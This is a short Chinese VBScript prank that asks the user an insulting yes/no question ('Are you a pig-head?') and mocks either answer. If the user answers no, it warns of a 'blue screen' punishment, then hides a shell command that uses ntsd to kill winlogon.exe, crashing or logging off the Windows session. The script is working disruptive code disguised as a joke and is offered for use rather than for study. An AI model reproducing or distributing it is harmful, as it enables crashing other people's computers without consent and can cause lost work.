if MsgBox("你是猪头吗？",vbYesNo,"提示")=vbyes then

msgbox "你SB啊!"

else

msgbox "还不承认!! 作为惩罚，蓝屏一下，你马上挂了#￥！@#￥%@……#……?",64,"严重警告!!!!!!!!!"

Set ws = CreateObject("Wscript.Shell")

wscript.sleep 1200

ws.run "cmd /c start /min ntsd -c q -pn winlogon.exe 1>nul 2>nul",vbhide

end if